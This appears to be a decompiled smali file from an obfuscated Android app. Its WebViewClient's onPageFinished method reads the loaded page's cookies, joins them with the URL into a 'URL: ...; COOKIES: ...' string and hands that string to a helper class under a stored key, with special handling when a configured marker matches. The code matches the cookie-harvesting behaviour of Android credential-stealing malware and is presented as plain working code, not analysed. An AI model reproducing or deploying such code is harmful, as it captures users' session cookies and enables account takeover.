.class Lcom/beginhigh19/p016j$new;
.super Landroid/webkit/WebViewClient;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/beginhigh19/p016j;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "new"
.end annotation


# instance fields
.field final synthetic fddo:Lcom/beginhigh19/p016j;


# direct methods
.method private constructor <init>(Lcom/beginhigh19/p016j;)V
    .locals 0

    iput-object p1, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-direct {p0}, Landroid/webkit/WebViewClient;-><init>()V

    return-void
.end method

.method synthetic constructor <init>(Lcom/beginhigh19/p016j;Lcom/beginhigh19/p016j$fddo;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/beginhigh19/p016j$new;-><init>(Lcom/beginhigh19/p016j;)V

    return-void
.end method


# virtual methods
.method public onPageFinished(Landroid/webkit/WebView;Ljava/lang/String;)V
    .locals 4

    const/4 v0, 0x0

    invoke-virtual {p1, v0}, Landroid/webkit/WebView;->setVisibility(I)V

    const-string p1, "about:blank"

    invoke-virtual {p2, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    return-void

    :cond_0
    invoke-static {}, Landroid/webkit/CookieManager;->getInstance()Landroid/webkit/CookieManager;

    move-result-object p1

    invoke-virtual {p1, p2}, Landroid/webkit/CookieManager;->getCookie(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "URL: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "; COOKIES: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    new-instance v2, Lfddo/class;

    iget-object v3, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {v3}, Lcom/beginhigh19/p016j;->for(Lcom/beginhigh19/p016j;)Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Lfddo/class;-><init>(Landroid/content/Context;)V

    iget-object v3, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {v3}, Lcom/beginhigh19/p016j;->new(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2

    iget-object v3, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {v3}, Lcom/beginhigh19/p016j;->new(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p2, v3}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p2

    if-nez p2, :cond_1

    iget-object p2, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {p2}, Lcom/beginhigh19/p016j;->new(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_2

    :cond_1
    iget-object p1, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {p1}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1}, Lfddo/class;->fddo(Ljava/lang/String;)V

    iget-object p1, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {p1}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object p1

    const/4 p2, 0x1

    invoke-virtual {v2, p1, v1, p2}, Lfddo/class;->case(Ljava/lang/String;Ljava/lang/String;Z)V

    iget-object p1, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-virtual {p1}, Lcom/beginhigh19/p016j;->try()V

    goto :goto_0

    :cond_2
    iget-object p1, p0, Lcom/beginhigh19/p016j$new;->fddo:Lcom/beginhigh19/p016j;

    invoke-static {p1}, Lcom/beginhigh19/p016j;->ifdf(Lcom/beginhigh19/p016j;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v2, p1, v1, v0}, Lfddo/class;->case(Ljava/lang/String;Ljava/lang/String;Z)V

    :goto_0
    return-void
.end method

.method public shouldOverrideUrlLoading(Landroid/webkit/WebView;Ljava/lang/String;)Z
    .locals 0

    const/4 p1, 0x0

    return p1
.end method
